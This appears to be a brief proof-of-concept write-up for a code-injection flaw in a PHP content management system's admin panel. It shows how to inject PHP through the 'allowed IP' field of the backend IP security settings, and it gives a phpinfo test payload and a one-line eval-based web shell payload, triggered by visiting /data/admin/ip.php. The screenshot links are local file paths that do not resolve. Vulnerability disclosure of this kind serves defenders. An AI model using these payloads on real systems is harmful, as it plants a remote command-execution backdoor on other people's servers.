1、Download the source package and build it locally. Log in to the background, click System, then click Mail Server Settings, Background IP Security Settings

![image-20220324214456428](/Users/ming/Library/Application Support/typora-user-images/image-20220324214456428.png)

2、Then write malicious code in the allowed IP, write {${phpinfo()}} here, if you need to write a sentence Trojan for command execution, write ${@eval($_POST[a])}, then Refresh the page, or visit /data/admin/ip.php in the root directory

![image-20220324214711973](/Users/ming/Library/Application Support/typora-user-images/image-20220324214711973.png)

![image-20220324214725088](/Users/ming/Library/Application Support/typora-user-images/image-20220324214725088.png)